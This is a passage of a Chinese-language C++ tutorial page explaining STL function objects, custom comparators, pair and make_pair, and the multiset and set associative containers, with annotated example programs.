class="keyword">int</span> a1[<span class="number">4</span>] = &#123; <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span> &#125;;</span><br><span class="line">    A a2[<span class="number">5</span>] = &#123; <span class="number">13</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">16</span> &#125;;</span><br><span class="line">    sort(a1, a1 + <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1)&quot;</span>; Printlnterva1(a1, a1 + <span class="number">4</span>);  <span class="comment">//输出 1)1 2 4 5</span></span><br><span class="line">    sort(a2, a2 + <span class="number">5</span>);  <span class="comment">//按v的值从小到大排序</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2)&quot;</span>; Printlnterva1(a2, a2 + <span class="number">5</span>);  <span class="comment">//输出 2)8 9 12 13 16</span></span><br><span class="line">    sort(a2, a2 + <span class="number">5</span>, GreaterA);  <span class="comment">//按v的值从大到小排序</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3)&quot;</span>; Printlnterva1(a2, a2 + <span class="number">5</span>);  <span class="comment">//输出 3)16 13 12 9 8</span></span><br><span class="line">    sort(a2, a2 + <span class="number">5</span>, LessA());  <span class="comment">//按v的个位数从小到大排序</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;4)&quot;</span>; Printlnterva1(a2, a2 + <span class="number">5</span>);  <span class="comment">//输出 4)12 13 16 8 9</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译至第 45 行时，编译器将 sort 实例化得到的函数原型如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(A* first, A* last, <span class="keyword">bool</span> (*op)(<span class="keyword">const</span> A &amp;, <span class="keyword">const</span> A &amp;) )</span></span>;</span><br></pre></td></tr></table></figure>
<p>该函数在执行过程中，当要比较两个元素 a、b 的大小时，就是看 op(a, b) 和 op(b, a) 的返回值。本程序中 op 指向 GreaterA,因此就用 GreaterA 定义的规则来比较大小。</p>
<p>编译至第 47 行时，编译器将 sort 实例化得到的函数原型如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">( A* first, A* last, LessA op)</span></span>;</span><br></pre></td></tr></table></figure>
<p>该函数在执行过程中，当要比较两个元素 a、b 的大小时，就是看 op(a, b) 和 op(b, a) 的返回值。本程序中，op(a, b) 等价于 op.opeartor(a, b)，因此就用 LessA 定义的规则来比较大小。</p>
<p>STL 中定义了一些函数对象类模板，都位于头文件 functional 中。例如，greater 模板的源代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">greater</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">const</span> T&amp; x, <span class="keyword">const</span> T&amp; y)</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x &gt; y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>假设有以下数组：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">4</span>] = &#123;<span class="number">3</span>, <span class="number">5</span>, <span class="number">34</span>, <span class="number">8</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>要将该数组从大到小排序，则只需写：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">sort( a, a+<span class="number">4</span>, greater&lt;<span class="keyword">int</span>&gt;() );</span><br></pre></td></tr></table></figure>
<p>要使用 greater 模板，须确保<code>&gt;</code>运算符本来就有定义，或经过了适当的重载。</p>
<p>list 容器的 sort 成员能将元素从小到大排序。它也有两个版本：一个是没有参数的函数，比较大小用<code>&lt;</code>运算符；另一个是函数模板，原型如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">Pred</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">sort</span>(<span class="title">Pred</span> <span class="title">op</span>);</span></span><br></pre></td></tr></table></figure>
<p>sort 函数允许自定义比较大小的规则，即 op(x, y) 为真就认为 x 比 y 小。例如，假设有：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; lst;</span><br></pre></td></tr></table></figure>
<p>如果希望将 lst 中的元素按其整数数值从大到小排序，只需写：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">lst.sort( greater&lt;<span class="keyword">int</span>&gt;() );</span><br></pre></td></tr></table></figure>
<p>在使用关联容器和许多算法时，都可以用函数对象来定义比较大小的规则，以及其他一些规则和操作。</p>
<p><strong>STL 中的函数对象类模板</strong></p>
<p>STL 中有一些函数对象类模板，如表 1 所示。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数对象类模板</th>
<th>成员函数 T operator ( const T &amp; x, const T &amp; y) 的功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>plus <T></T></td>
<td>return x + y;</td>
</tr>
<tr>
<td>minus &lt; &gt;</td>
<td>return x - y;</td>
</tr>
<tr>
<td>multiplies <T></T></td>
<td>return x * y;</td>
</tr>
<tr>
<td>divides <T></T></td>
<td>return x / y;</td>
</tr>
<tr>
<td>modulus <T></T></td>
<td>return x % y;</td>
</tr>
<tr>
<td></td>
<td>成员函数 bool operator( const T &amp; x, const T &amp; y) 的功能</td>
</tr>
<tr>
<td>equal_to <T></T></td>
<td>return x == y;</td>
</tr>
<tr>
<td>not_equal_to <T></T></td>
<td>return x! = y;</td>
</tr>
<tr>
<td>greater <T></T></td>
<td>return x &gt; y;</td>
</tr>
<tr>
<td>less <T></T></td>
<td>return x &lt; y;</td>
</tr>
<tr>
<td>greater_equal <T></T></td>
<td>return x &gt; = y;</td>
</tr>
<tr>
<td>less_equal <T></T></td>
<td>return x &lt;= y;</td>
</tr>
<tr>
<td>logical_and <T></T></td>
<td>return x &amp;&amp; y;</td>
</tr>
<tr>
<td>logical_or <T></T></td>
<td>return x \</td>
<td>\</td>
<td>y;</td>
</tr>
<tr>
<td></td>
<td>成员函数 T operator( const T &amp; x) 的功能</td>
</tr>
<tr>
<td>negate <T></T></td>
<td>return - x;</td>
</tr>
<tr>
<td></td>
<td>成员函数 bool operator( const T &amp; x) 的功能</td>
</tr>
<tr>
<td>logical_not <T></T></td>
<td>return ! x;</td>
</tr>
</tbody>
</table>
</div>
<p>例如，如果要求两个 double 型变量 x、y 的乘积，可以写：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">multiplies&lt;<span class="keyword">double</span>&gt; () (x, y)</span><br></pre></td></tr></table></figure>
<p>less 是 STL 中最常用的函数对象类模板，其定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;class_Tp&gt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">less</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(const_Tp &amp; __x, const_Tp &amp; __y)</span> <span class="keyword">const</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> __x &lt; __y; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>要判断两个 int 变量 x、y 中 x 是否比 y 小，可以写：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( less&lt;<span class="keyword">int</span>&gt;()(x, y) ) &#123; ... &#125;</span><br></pre></td></tr></table></figure>
<p><strong>引入函数对象后 STL 中的“大”、“小”和“相等”概念</strong></p>
<p>前面提到过，默认情况下，STL 中的容器和算法比较元素的大小是通过<code>&lt;</code>运算符进行的。通过 10.3.4 节可知，sort 和 list::sort 都可以通过一个函数对象或函数自定义比较元素大小的规则。例如以下的 sort 版本：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;class_RandIt, <span class="class"><span class="keyword">class</span> <span class="title">Pred</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">sort</span>(_<span class="title">RandIt</span> <span class="title">first</span>, _<span class="title">RandIt</span> <span class="title">last</span>, <span class="title">Pred</span> <span class="title">op</span>);</span></span><br></pre></td></tr></table></figure>
<p>实际调用 sort 时，和 op 对应的实参可以是一个函数对象或者函数的名字。sort 在执行过程中用 op(x, y) 比较 x 和 y 的大小，因此可以将 op 称为自定义的“比较器”。</p>
<p>关联容器中的元素是从小到大排序的。使用关联容器时，也可以用自定义的比较器取代<code>&lt;</code>运算符，以规定元素之间的大小关系。STL 中还有许多算法都可以自定义比较器。在自定义比较器 op 的情况下，以下三种说法是等价的：</p>
<ul>
<li>x 小于 y。</li>
<li>op(x, y) 的返回值为 true。</li>
<li>y 大于 x。</li>
</ul>
<p>同样地，对关联容器的 find 和 count 成员函数以及其他一些在有序区间上的 STL 算法而言，在自定义比较器 op 的情况下，<code>x和y相等</code>与<code>op(x, y)和op(y, x)都为假</code>是等价的。</p>
<h4 id="C-关联容器，STL关联容器"><a href="#C-关联容器，STL关联容器" class="headerlink" title="C++关联容器，STL关联容器"></a>C++关联容器，STL关联容器</h4><p>关联容器内部的元素都是排好序的，有以下四种。</p>
<ul>
<li>set：排好序的集合，不允许有相同元素。</li>
<li>multiset：排好序的集合，允许有相同元素。</li>
<li>map：每个元素都分为关键字和值两部分，容器中的元素是按关键字排序的。不允许有多个元素的关键字相同。</li>
<li>multimap：和 map 类似，差别在于元素的关键字可以相同。</li>
</ul>
<p>不能修改 set 或 multiset 容器中元素的值。因为元素被修改后，容器并不会自动重新调整顺序，于是容器的有序性就会被破坏，再在其上进行查找等操作就会得到错误的结果。因此，如果要修改 set 或 multiset 容器中某个元素的值，正确的做法是先删除该元素，再插入新元素。</p>
<p>同理，也不能修改 map 和 multimap 容器中元素的关键字。</p>
<p>关联容器内部的元素或关键字之间比较大小可以用<code>&lt;</code>运算符，也可以用自定义的比较器。因为有序，所以在关联容器上进行查找的速度较快。</p>
<p>使用关联容器的目的也就在于快速查找。当一个元素被插入关联容器时，该元素会和已有的元素进行比较，最终被插入一个合适的位置。</p>
<p>在关联容器中查找元素和插入元素的时间复杂度都是 O(log(n))。从 begin() 到 end() 遍历整个关联容器，就是从小到大遍历整个容器。</p>
<p>在排好序的 vector 和 deque 上进行折半查找，时间复杂度也可以是 O(log(n))。但是，对于插入、删除和查询交替进行的情况，使用 vector 和 deque 的效率不高。因为它们上面的插入和删除操作会引起元素的移动，时间复杂度是 O(n)。</p>
<p>关联容器一般是用平衡二叉树实现的。平衡二叉树的原理属于“<a href="http://c.biancheng.net/data_structure/">数据结构</a>”课程的内容，本教程不做介绍。</p>
<p>除了所有容器共有的成员函数外，关联容器还具有以下成员函数：</p>
<ul>
<li>find：查找某个值。</li>
<li>lower_bound：查找某个下界。</li>
<li>upper_bound：查找某个上界。</li>
<li>equal_range：同时查找上界和下界。</li>
<li>count：计算等于某个值的元素个数。</li>
<li>insert：插人一个元素或一个区间。</li>
</ul>
<h4 id="C-pair类模板，STL-pair类模板"><a href="#C-pair类模板，STL-pair类模板" class="headerlink" title="C++ pair类模板，STL pair类模板"></a>C++ pair类模板，STL pair类模板</h4><p>在学习关联容器之前，首先要了解 <a href="http://c.biancheng.net/stl/">STL</a> 中的 pair 类模板，因为关联容器的一些成员函数的返回值是 pair 对象，而且 map 和 multimap 容器中的元素都是 pair 对象。pair 的定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;class_Tl, class_T2&gt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pair</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _T1 first;</span><br><span class="line">    _T2 second;</span><br><span class="line">    <span class="built_in">pair</span>(): first(), second() &#123;&#125;  <span class="comment">//用无参构造函数初始化 first 和 second</span></span><br><span class="line">    <span class="built_in">pair</span>(<span class="keyword">const</span> _T1 &amp;__a, <span class="keyword">const</span> _T2 &amp;__b): first(__a), second(__b) &#123;&#125;</span><br><span class="line">    <span class="keyword">template</span> &lt;class_U1, class_U2&gt;</span><br><span class="line">    <span class="built_in">pair</span>(<span class="keyword">const</span> <span class="built_in">pair</span> &lt;_U1, _U2&gt; &amp;__p): first(__p.first), second(__p.second) &#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>pair实例化出来的类都有两个成员变量，一个是 first, 一个是 second。</p>
<p>STL 中还有一个函数模板 make_pair，其功能是生成一个 pair 模板类对象。make_pair 的源代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T1</span>, <span class="title">class</span> <span class="title">T2</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">pair</span>&lt;T1, T2 &gt; <span class="title">make_pair</span>(<span class="title">T1</span> <span class="title">x</span>, <span class="title">T2</span> <span class="title">y</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">return</span> ( <span class="built_in">pair</span>&lt;T1, T2&gt; (x, y) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面的程序演示了 pair 和 make_pair 的用法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">pair</span>&lt;<span class="keyword">int</span>,<span class="keyword">double</span>&gt; p1;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; p1.first &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; p1.second &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出  0,0   </span></span><br><span class="line">    pair&lt;string,int&gt; p2(&quot;this&quot;,20);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; p2.first &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; p2.second &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出  this,20</span></span><br><span class="line">    pair&lt;int,int&gt; p3(pair&lt;char,char&gt;(&#x27;a&#x27;,&#x27;b&#x27;));</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; p3.first &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; p3.second &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出  97,98</span></span><br><span class="line">    <span class="built_in">pair</span>&lt;<span class="keyword">int</span>,<span class="built_in">string</span>&gt; p4 = <span class="built_in">make_pair</span>(<span class="number">200</span>,<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; p4.first &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; p4.second &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出  200,hello</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>pair 模板中的第三个构造函数是函数模板，参数必须是一个 pair 模板类对象的引用。程序中第 9 行的 p3 就是用这个构造函数初始化的。</p>
<h4 id="C-multiset，STL-multiset详解"><a href="#C-multiset，STL-multiset详解" class="headerlink" title="C++ multiset，STL multiset详解"></a>C++ multiset，STL multiset详解</h4><p>multiset 是关联容器的一种，是排序好的集合（元素已经进行了排序），并且允许有相同的元素。</p>
<p>不能直接修改 multiset 容器中元素的值。因为元素被修改后，容器并不会自动重新调整顺序，于是容器的有序性就会被破坏，再在其上进行查找等操作就会得到错误的结果。因此，如果要修改 multiset 容器中某个元素的值，正确的做法是先删除该元素，再插入新元素。</p>
<p>使用 multiset 必须包含头文件 <set>。multiset 类模板的定义如下：</set></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">Key</span>, <span class="title">class</span> <span class="title">Pred</span> = <span class="title">less</span>&lt;Key&gt;, <span class="title">class</span> <span class="title">B</span> = <span class="title">allocator</span>&lt;Key&gt; &gt; <span class="title">class</span> <span class="title">multiset</span> &#123;</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>该模板有三个类型参数：Key、Pred 和 B。类型参数可以有默认值，默认值就是某种类型。例如，Pred 类型参数的默认值就是 less<Key> 类型，B 的默认值就是 allocator<Key> 类型。第三个类型参数极少用到，一般都用默认值，因此这里不做介绍。</Key></Key></p>
<p>第一个类型参数说明 multiset 容器中的每个元素都是 Key 类型的。第二个类型参数 Pred 用于指明容器中元素的排序规则，在被实例化后，Pred 可以是函数对象类，也可以是函数<a href="http://c.biancheng.net/c/80/">指针</a>类型。</p>
<p>multiset 内部在排序时定义了一个变量<code>Pred op</code>，根据表达式<code>op(x, y)</code>来比较两个元素 x、y 的大小。该表达式的值为 true，则说明 x 比 y 小。Pred 的默认值是 less<Key>，less 是 <a href="http://c.biancheng.net/stl/">STL</a> 中的函数对象类模板，其定义如下：</Key></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;class_Tp&gt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">less</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="keyword">const</span> _Tp &amp;__x, <span class="keyword">const</span> _Tp &amp;__y)</span> <span class="keyword">const</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> __x &lt; __y; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这说明，在默认情况下，multiset 容器中的元素是用<code>&lt;</code>运算符比较大小的。例如，假设 A 是一个类的名字，可以定义一个如下的容器对象：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">multiset</span> &lt;A&gt; s;</span><br></pre></td></tr></table></figure>
<p>由于 multiset 的类型参数可以使用默认值，因此上面的语句等价于：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">multiset</span> &lt; <span class="keyword">int</span>, less&lt;A&gt;, allocator&lt;A&gt; &gt; s;</span><br></pre></td></tr></table></figure>
<p>模板类 multiset &lt; A, less<A>, allocator<A> &gt; 的 insert 成员函数可以用来插入一个元素。 插入过程中需要进行元素之间的比较，可以认为 insert 成员函数中定义了一个变量 less <A> op，用 op(x, y) 来比较元素 x、y 的大小。归根到底，还是用<code>&lt;</code>运算符比较 x、y 的大小。 因此，<code>&lt;</code>运算符必须经过适当重载，才可以向 multiset <A>容器中插人元素。</A></A></A></A></p>
<p>下面的程序 会编译出错：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">multiset</span> &lt;A&gt; a;</span><br><span class="line">    a.insert( A() );  <span class="comment">//编译出错，因为不能用“&lt;”运算符比较两个A对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>multiset 常用的成员函数如表 1 所示。有的成员函数有不止一个版本，这里不一一 列出。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>成员函数或成员函数模板</th>
<th>作  用</th>
</tr>
</thead>
<tbody>
<tr>
<td>iterator find (const T &amp; val);</td>
<td>在容器中查找值为 val 的元素，返回其迭代器。如果找不到，返 回 end()</td>
</tr>
<tr>
<td>iterator insert( const T &amp; val);</td>
<td>将 val 插入容器中并返回其迭代器</td>
</tr>
<tr>
<td>void insert(iterator first, iterator last);</td>
<td>将区间 [first, last) 中的元素插人容器</td>
</tr>
<tr>
<td>int count( const T &amp; val);</td>
<td>统计有多少个元素的值和 val 相等</td>
</tr>
<tr>
<td>iterator lower_bound( const T &amp; val);</td>
<td>查找一个最大的位置 it，使得 [begin(), it) 中所有的元素者比 val 小</td>
</tr>
<tr>
<td>iterator upper_bound( const T &amp; val);</td>
<td>查找一个最小的位置 it，使得 [it, end()) 中所有的元素都比 val 大</td>
</tr>
<tr>
<td>pair <iterator, iterator> equal_range (const T &amp; val);</iterator,></td>
<td>同时求得 lower_bound 和 upper_bound</td>
</tr>
<tr>
<td>iterator erase(iterator it);</td>
<td>删除 it 指向的元素，返回其后面的元素的迭代器（Visual Studio 2010 中如此，但是在 <a href="http://c.biancheng.net/cplus/">C++</a> 标准和 Dev C++ 中，返回值不是这样）</td>
</tr>
<tr>
<td>iterator erase(iterator first, iterator last);</td>
<td>删除区间 [first, last)，返回 last（Visual Studio 2010 中如此，但是在 C++ 标准和 Dev C++ 中，返回值不是这样）</td>
</tr>
</tbody>
</table>
</div>
<p>multiset 及 set 中的 find 和 count 并不是用<code>==</code>运算符比较元素是否和待查找的值相等的。它们进行比较的原则是：如果<code>x比y小</code>和<code>y比x小</code>同时为假，就认为 x 和 y 相等。</p>
<p>下面通过一个例子说明 multiset 的用法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;  //使用multiset须包含此头文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">Print</span>(<span class="title">T</span> <span class="title">first</span>, <span class="title">T</span> <span class="title">last</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">for</span> (; first != last; ++first)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *first &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    A(<span class="keyword">int</span> n_) &#123; n = n_; &#125;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> A &amp; a1, <span class="keyword">const</span> A &amp; a2)</span><br><span class="line">    &#123; <span class="keyword">return</span> a1.n &lt; a2.n; &#125;</span><br><span class="line">    <span class="keyword">friend</span> ostream &amp; <span class="keyword">operator</span> &lt;&lt; (ostream &amp; o, <span class="keyword">const</span> A &amp; a2)</span><br><span class="line">    &#123; o &lt;&lt; a2.n; <span class="keyword">return</span> o; &#125;</span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">MyLess</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyLess</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="keyword">const</span> A &amp; a1, <span class="keyword">const</span> A &amp; a2)</span>  <span class="comment">//按个位数比较大小</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> (a1.n % <span class="number">10</span>) &lt; (a2.n % <span class="number">10</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">multiset</span> &lt;A&gt; MSET1;  <span class="comment">//MSET1 用“&lt;”运算符比较大小</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">multiset</span> &lt;A, MyLess&gt; MSET2;  <span class="comment">//MSET2 用 MyLess::operator() 比较大小</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> SIZE = <span class="number">6</span>;</span><br><span class="line">    A a[SIZE] = &#123; <span class="number">4</span>, <span class="number">22</span>, <span class="number">19</span>, <span class="number">8</span>, <span class="number">33</span>, <span class="number">40</span> &#125;;</span><br><span class="line">    MSET1 m1;</span><br><span class="line">    m1.insert(a, a + SIZE);</span><br><span class="line">    m1.insert(<span class="number">22</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1)&quot;</span> &lt;&lt; m1.count(<span class="number">22</span>) &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 1)2</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2)&quot;</span>; Print(m1.begin(), m1.end());  <span class="comment">//输出 2)4 8 19 22 22 33 40</span></span><br><span class="line">    MSET1::iterator pp = m1.find(<span class="number">19</span>);</span><br><span class="line">    <span class="keyword">if</span> (pp != m1.end())  <span class="comment">//条件为真说明找到</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;found&quot;</span> &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//本行会被执行，输出 found</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3)&quot;</span>; <span class="built_in">cout</span> &lt;&lt; *m1.lower_bound(<span class="number">22</span>)</span><br><span class="line">        &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; *m1.upper_bound(<span class="number">22</span>) &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出 3)22,33</span></span><br><span class="line">    pp = m1.erase(m1.lower_bound(<span class="number">22</span>), m1.upper_bound(<span class="number">22</span>));</span><br><span class="line">    <span class="comment">//pp指向被删元素的下一个元素</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;4)&quot;</span>; Print(m1.begin(), m1.end());  <span class="comment">//输出 4)4 8 19 33 40</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;5)&quot;</span>; <span class="built_in">cout</span> &lt;&lt; *pp &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 5)33</span></span><br><span class="line">    MSET2 m2;  <span class="comment">//m2中的元素按n的个位数从小到大排序</span></span><br><span class="line">    m2.insert(a, a + SIZE);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;6)&quot;</span>; Print(m2.begin(), m2.end());  <span class="comment">//输出 6)40 22 33 4 8 19</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第 30 行，MSET2 类的排序规则和 MSET1 不同。MSET2 用 MyLess 定义排序规则，即 n 的个位数小的元素排在前面。</p>
<p>第 43、44 行，lower_bound 返回的迭代器指向第一个 22，upper_bound 返回的迭代器指向 33。</p>
<p>第 45 行，删除所有值为 22 的元素。erase 成员函数删除一个元素后，返回下一个元素的迭代器应该是很合理的，但是 C++ 标准委员会认为，返回下一个元素的迭代器也是需要时间开销的，如果程序员不想要这个返回值，那么这个开销就是浪费的——因此在遵循 C++ 标准的 Dev C++ 中，本行无法编译通过。但是微软公司认为应该对这一点做出改进，因此 Visual Studio 2010 将 erase 成员函数处理成返回被删元素下一个元素的迭代器。</p>
<p>不论在哪种编译器中，用 erase 成员函数删除迭代器 i 指向的元素后，迭代器 i 即告失效， 此时不能指望 ++i 后 i 会指向被删除元素的下一个元素；相反，++i 可能立即导致出错。如果想要得到被删除元素后面那个元素的迭代器，可以在删除前获取其迭代器并保存起来（这同样适用于 set、map、multimap 的 erase 成员函数）。事实上，如果得到了某关联容器的迭代器，则该迭代器并不会因为容器中元素的插入以及其他元素的删除而失效。只要该迭代器指向的元素没有被删除，就可以一直使用它。</p>
<h4 id="C-set，STL-set详解"><a href="#C-set，STL-set详解" class="headerlink" title="C++ set，STL set详解"></a>C++ set，STL set详解</h4><p>set 是关联容器的一种，是排序好的集合（元素已经进行了排序）。set 和 multiset 类似，它和 multiset 的差别在于 set 中不能有重复的元素。multiset 的成员函数 set 中也都有。</p>
<p>不能直接修改 set 容器中元素的值。因为元素被修改后，容器并不会自动重新调整顺序，于是容器的有序性就会被破坏，再在其上进行查找等操作就会得到错误的结果。因此，如果要修改 set 容器中某个元素的值，正确的做法是先删除该元素，再插入新元素。</p>
